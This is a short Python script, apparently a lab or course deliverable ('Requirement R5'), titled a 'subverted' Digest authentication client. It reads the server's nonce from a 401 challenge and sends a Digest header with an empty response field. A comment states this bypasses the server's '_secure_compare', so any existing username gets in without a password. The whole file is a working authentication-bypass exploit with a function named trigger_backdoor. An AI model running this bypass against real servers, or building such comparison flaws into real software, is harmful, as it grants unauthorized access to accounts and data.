"""
Subverted Digest Authentication Client
Satisfies Requirement R5.
"""
import urllib.request
import urllib.error
import re

def trigger_backdoor(url):
    try:
        urllib.request.urlopen(url)
    except urllib.error.HTTPError as e:
        if e.code == 401:
            auth_header = e.headers.get("WWW-Authenticate")
            match = re.search(r'nonce="([^"]+)"', auth_header)
            
            if match:
                nonce = match.group(1)
                
                # Request credentials but ignore the password
                print("[!] Subverted mode activated")
                username = input("Target Username (must exist on server): ")
                _ = input("Password (can be left blank - bypassed): ")

                req = urllib.request.Request(url)
                # Exploit: Send an empty response string to bypass _secure_compare
                malicious_auth = f'Digest username="{username}", nonce="{nonce}", response=""'
                req.add_header("Authorization", malicious_auth)

                try:
                    resp = urllib.request.urlopen(req)
                    print(f"Status Code: {resp.getcode()} OK")
                    print(resp.read().decode())
                except urllib.error.HTTPError as err:
                    print(f"Failed. Status Code: {err.code}")
        else:
            print(f"Unexpected HTTP Error: {e.code}")

if __name__ == "__main__":
    target_url = input("Enter server URL (e.g., http://127.0.0.1:8080/): ")
    trigger_backdoor(target_url)